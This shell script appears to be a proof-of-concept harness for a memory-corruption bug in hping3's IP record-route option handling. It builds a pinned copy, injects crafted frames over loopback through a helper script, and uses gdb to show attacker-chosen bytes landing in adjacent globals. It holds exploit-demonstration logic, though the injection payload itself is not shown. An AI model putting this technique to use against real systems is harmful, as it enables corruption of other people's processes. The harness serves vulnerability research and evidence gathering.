#!/bin/sh
# Wire-visible chosen bytes in a real adjacent global of the plain pinned hping3.
# Loopback only: 127.0.0.2 -> 127.0.0.1.  No pinned source is edited.
# NO_INJECT=1 gives a baseline process that receives no crafted frames.
set -u
cd "$(dirname "$0")" || exit 1
mkdir -p evidence
tag=${NO_INJECT:-0}
[ "$tag" = 1 ] && tag=baseline || tag=attack
rm -f plain.pid "evidence/plain-$tag-gdb.out" "evidence/plain-$tag-proof.out"

PINNED_SHA=e8ef2dd63b3f7b5e5d87d14a50bdc64c6befc94a8e21801f060708f2dcbb5e7b
mkdir -p compat/net
: > compat/net/bpf.h   # BSD-only header; its sole use is #if-guarded off on Linux
if [ ! -x plain-src/hping3 ]; then
    [ -d hping-src ] || cp -a ../provision/hping-src hping-src
    [ -d plain-src ] || cp -a hping-src plain-src
    ( cd plain-src || exit 1
      [ -f Makefile ] || ./configure --no-tcl >/dev/null 2>&1
      make clean >/dev/null 2>&1
      make -j4 CCOPT='-O0 -g -fcommon -Wall -Wno-unused -I../compat' >../plain-build.log 2>&1 ) || {
        echo "plain build failed"; exit 2; }
fi
[ "$(sha256sum plain-src/display_ipopt.c | cut -d' ' -f1)" = "$PINNED_SHA" ] || {
    echo "plain-src display_ipopt.c is not the pinned bytes"; exit 2; }
nm -n -S --defined-only plain-src/hping3 | grep -E 'old_rr\.0| rc4_sbox$' > evidence/plain-layout.txt
OLD_RR_LO=$(nm -n -S --defined-only plain-src/hping3 | awk '/ old_rr\.0$/{print $1}')
[ -n "$OLD_RR_LO" ] || { echo "no old_rr symbol"; exit 2; }

sudo -n sh -c 'echo $$ > plain.pid; exec ./plain-src/hping3 -D -1 -G -I lo -c 20 -i 1 127.0.0.2' \
    > "evidence/plain-$tag-run.out" 2>&1 &
hp=$!
for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15; do
    [ -s plain.pid ] && break
    sleep 0.1
done
pid=$(cat plain.pid 2>/dev/null || echo 0)
if [ "$pid" -eq 0 ]; then echo "no hping pid"; exit 2; fi
echo "plain hping pid=$pid mode=$tag"

if [ "${NO_INJECT:-0}" = 0 ]; then
    sudo -n python3 inject_rr_plain.py --pid "$pid" --ptr 255 --rr-len 255 --count 3 --gap 0.15
else
    echo "NO_INJECT=1: baseline, no crafted frames"
fi
sleep 0.4
mapline=$(sudo -n awk '$3=="00000000" {print $1; exit}' "/proc/$pid/maps")
base="0x${mapline%%-*}"
addr=$(printf '0x%x' "$(( $base + 0x$OLD_RR_LO ))")
echo "pie_base=$base old_rr_link=$OLD_RR_LO old_rr_runtime=$addr"

sudo -n gdb -q -batch -p "$pid" \
    -ex "x/120xb $addr" \
    -ex 'info address rc4_sbox' \
    > "evidence/plain-$tag-gdb.out" 2>&1
gdb_rc=$?
kill "$hp" 2>/dev/null
wait "$hp" 2>/dev/null

echo "gdb_rc=$gdb_rc"
grep -E '^0x.*rc4_sbox|<old_rr.0>|^0x[0-9a-f]+:.*0x13|error' "evidence/plain-$tag-gdb.out" | head -20
if [ "$tag" = baseline ]; then
    python3 check_plain.py baseline "evidence/plain-$tag-gdb.out" > "evidence/plain-$tag-proof.out"
else
    python3 check_plain.py "evidence/plain-$tag-gdb.out" > "evidence/plain-$tag-proof.out"
fi
cat "evidence/plain-$tag-proof.out"
grep -q '^PLAIN SUMMARY: .* PASS' "evidence/plain-$tag-proof.out" && exit 0 || exit 1
